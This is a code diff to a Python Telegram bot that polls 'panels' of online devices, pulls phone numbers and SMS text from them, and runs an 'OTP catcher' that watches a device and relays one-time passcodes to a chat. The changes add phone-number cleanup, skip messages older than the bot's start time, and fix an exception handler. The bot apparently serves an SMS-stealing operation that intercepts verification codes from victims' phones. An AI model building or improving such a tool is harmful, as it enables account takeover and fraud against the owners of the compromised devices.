@@ -35,6 +35,7 @@ STATE_FILE = Path(__file__).parent / "bot_state.json"
 ADMINS_FILE = Path(__file__).parent / "admins.json"
 PANELS_FILE = Path(__file__).parent / "panels.json"
 
+BOT_START_TIME = time.time() # Yeh line bot start hone ka time note karegi
 IS_INITIALIZED = False
 MAX_CONCURRENT = 30
 semaphore = asyncio.Semaphore(MAX_CONCURRENT)
@@ -158,13 +159,23 @@ def device_is_online(d: dict) -> bool:
             if ts and (now - ts) < 10 * 60 * 1000: return True
     return False
 
+def clean_number(val: str) -> str:
+    if not val: return ""
+    digits = re.sub(r'\D', '', str(val))
+    if len(digits) == 12 and digits.startswith("91"):
+        digits = digits[2:]
+    elif len(digits) == 11 and digits.startswith("0"):
+        digits = digits[1:]
+    if len(digits) == 10:
+        return digits
+    return ""
+
 def _extract_number(d: dict) -> str:
     if not isinstance(d, dict): return ""
     for f in ("number", "phoneNumber", "phone", "fromNumber", "sim_number", "to", "mobile"):
         if f in d and d[f]:
-            val = str(d[f]).strip()
-            if len(re.sub(r'\D', '', val)) >= 7 and len(re.sub(r'\D', '', val)) <= 15:
-                return val
+            cleaned = clean_number(d[f])
+            if cleaned: return cleaned
     for k, v in d.items():
         if isinstance(v, dict):
             res = _extract_number(v)
@@ -173,7 +184,7 @@ def _extract_number(d: dict) -> str:
 
 def _extract_number_from_msg(text: str) -> str:
     if not text: return ""
-    matches = re.findall(r'\b(?:\+?91[\-\s]?)?([6-9]\d{9})\b', text)
+    matches = re.findall(r'\b([6-9]\d{9})\b', text)
     return matches[0] if matches else ""
 
 async def fetch_online_devices(client, base, dev_node):
@@ -250,8 +261,25 @@ async def process_device(client, pk, pc, did, num, state, admins, app, is_new_pa
             mid = str(md.get("id", mk))
             key = f"{pk}:{did}:{mid}"
             if state.get(key): continue
+            
+            # Timestamp check (Message ka time nikalna)
+            msg_time = 0
+            for tf in ("timestamp", "time", "dateTime"):
+                if tf in md:
+                    try:
+                        v = md[tf]
+                        msg_time = (v / 1000) if v > 1e12 else float(v)
+                        break
+                    except: pass
+            
+            # 1. Initialization / New panel check
             if not IS_INITIALIZED or is_new_panel:
                 state[key] = True; continue
+            
+            # 2. Time check: If message is older than bot start time, skip it
+            if msg_time > 0 and msg_time < BOT_START_TIME:
+                state[key] = True; continue
+                
             text = extract_text(md)
             if not text:
                 state[key] = True; continue
@@ -320,7 +348,7 @@ async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
             save_state(state)
     except Exception as e: logger.error(f"monitor outer: {e}")
 
-# ─── OTP CATCHER (REAL STOP FIX) ─────────────────────────────────────────────
+# ─── OTP CATCHER ─────────────────────────────────────────────────────────────
 
 async def otp_catcher_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
@@ -404,7 +432,7 @@ async def otp_watch(app, chat_id, pk, did):
             try: await watch_msg.edit_reply_markup(reply_markup=None)
             except Exception: pass
             await app.bot.send_message(chat_id, f"⌛ <b>OTP watch timeout</b> (<code>{did}</code>).", parse_mode="HTML")
-    except Exception: 
+    except Exception as e: 
         active_watches.discard(did)
         logger.error(f"otp_watch outer: {e}")
 
